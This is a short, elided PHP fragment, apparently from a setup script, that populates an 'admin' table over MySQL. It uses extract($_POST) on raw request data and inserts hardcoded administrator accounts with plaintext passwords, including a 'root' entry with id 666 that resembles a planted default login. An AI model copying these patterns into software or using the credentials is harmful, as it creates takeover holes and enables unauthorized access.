    ...
    extract($_POST);
     ...
     if($link){
            ...
            mysqli_query($link, $sql);
              ...
              $sql =" INSERT INTO `admin` (`id`, `nombre`, `username`, `password`) VALUES (666, 'root', 'admin', '3sf4c1l')";
            mysqli_query($link, $sql);
            
            $sql =" INSERT INTO `admin` (`id`, `nombre`, `username`, `password`) VALUES (2, 'Maximo Bautista', 'link04', '8292824710')";
            mysqli_query($link, $sql);
